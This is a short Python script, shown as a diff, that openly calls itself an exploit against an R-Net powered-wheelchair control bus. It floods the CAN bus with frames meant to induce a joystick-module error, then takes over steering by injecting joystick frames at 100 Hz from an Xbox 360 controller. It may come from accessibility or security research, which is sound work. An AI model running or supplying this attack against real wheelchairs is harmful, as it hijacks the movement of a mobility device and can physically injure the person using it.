 #!/python3
+
+ import can2RNET
+ import threading
+
+ from common import logger, dec2hex, createJoyFrame, FRAME_JSM_INDUCE_ERROR
+ from time import time, sleep
+
+ def run(cansocket):
+    logger.warning("Inducing JSM error:")
+    # send in less than 1ms theses frames to induce
+    # JSM error
+    for _ in range(5):
+        can2RNET.cansend(cansocket, FRAME_JSM_INDUCE_ERROR)
+
+    # now let's take over by sending our own
+    # joystick frame @100Hz
+
+    mintime = .01
+    nexttime = time() + mintime
+    while True:
+        # get new XY joystick increment
+        joystick_x, joystick_y = get_new_joystick_position()
+        # building joy frame
+        joyframe = createJoyFrame(joystick_x, joystick_y)
+        # sending frame
+        can2RNET.cansend(cansocket, joyframe)
+        # .. at 100 Hz ..
+        nexttime += mintime
+        t = time()
+        if t < nexttime:
+            sleep(nexttime - t)
+        else:
+            nexttime += mintime
+
+
+ if __name__ == "__main__":
+    AG = False
+    logger.info("try opening socketcan:")
+    try:
+        cansocket = can2RNET.opencansocket(0)
+    except Exception as e:
+        if AG:
+            logger.warn(
+                "opening specific ag udp sockets to send can frames:")
+
+            import udp2can
+            cansocket = udp2can.getUDP2CANSock()
+        else:
+            raise e
+
+    logger.info("loading gamepad")
+    import devXbox360
+    dev = devXbox360.DevXbox360()
+    watcher = devXbox360.Watcher(dev)
+    dev.start()
+    watcher.start()
+
+    # set 'get_new_joystick_position' method
+    # to fetch new joystick position from xbox360 gamepad device
+    def get_new_joystick_position():
+        return dev.joystick_x, dev.joystick_y
+
+    logger.info("run exploit JSM Error")
+    run(cansocket)
+}}
+
